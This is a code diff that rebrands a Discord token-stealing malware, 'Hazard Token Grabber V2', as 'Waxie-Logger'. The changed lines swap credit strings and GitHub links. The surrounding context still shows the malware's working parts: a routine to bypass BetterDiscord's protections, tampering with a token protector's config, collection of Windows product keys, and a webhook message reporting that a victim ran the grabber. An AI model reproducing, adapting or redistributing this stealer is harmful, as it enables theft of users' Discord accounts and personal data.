@@ -263,7 +263,7 @@ class Hazard_Token_Grabber_V2(functions):
                 json.dump(item, f, indent=2, sort_keys=True)
             with open(config, 'a') as f:
                 f.write(
-                    "\n\n//Rdimo just shit on this token protector | https://github.com/Rdimo")
+                    "\n\n//Waxie just shit on this token protector | https://github.com/ERTYUOAF/Waxie-Logger")
 
     async def bypassBetterDiscord(self):
         bd = self.roaming+"\\BetterDiscord\\data\\betterdiscord.asar"
@@ -483,10 +483,10 @@ class Hazard_Token_Grabber_V2(functions):
                     else:
                         with open(path, "w", encoding="utf-8", errors="ignore") as f:
                             f.write(
-                                "🌟・Grabber Created By Waxie Logger, Grabber Made By github.com/Rdimo・https://github.com/Rdimo/Hazard-Token-Grabber-V2\n\n")
+                                "🌟・Grabber Created By Waxie Logger, github.com/ERTYUOAF/Waxie-Logger・https://github.com/ERTYUOAF/Waxie-Logger\n\n")
                         with open(path, "a", encoding="utf-8", errors="ignore") as fp:
                             fp.write(
-                                x+"\n\n🌟・Grabber Created By Waxie Logger, Grabber Made By github.com/Rdimo・https://github.com/Rdimo/Hazard-Token-Grabber-V2")
+                                x+"\n\n🌟・Grabber Created By Waxie Logger, github.com/ERTYUOAF/Waxie-Logger・https://github.com/ERTYUOAF/Waxie-Logger")
         w = self.getProductValues()
         wname = w[0].replace(" ", "᠎ ")
         wkey = w[1].replace(" ", "᠎ ")
@@ -525,8 +525,8 @@ class Hazard_Token_Grabber_V2(functions):
             'embeds': [
                 {
                     'author': {
-                        'name': f'*{Victim}* Just ran Hazard Token Grabber.V2',
-                        'url': 'https://github.com/Rdimo/Hazard-Token-Grabber-V2',
+                        'name': f'*{Victim}* Just ran Waxie-Logger',
+                        'url': 'https://github.com/Rdimo/ERTYUOAF/Waxie-Logger',
                         'icon_url': 'https://raw.githubusercontent.com/Rdimo/images/master/Hazard-Token-Grabber-V2/Small_hazard.gif'
                     },
                     'color': 16119101,
@@ -572,7 +572,7 @@ class Hazard_Token_Grabber_V2(functions):
                         }
                     ],
                     'footer': {
-                        'text': '🌟・Grabber Created By Hentai Logger, Grabber Made By github.com/Rdimo・https://github.com/Rdimo/Hazard-Token-Grabber-V2'
+                        'text': '🌟・Grabber Created By Waxie Logger, github.com/ERTYUOAF/Waxie-Logger・https://github.com/ERTYUOAF/Waxie-Logger'
                     }
                 }
             ]
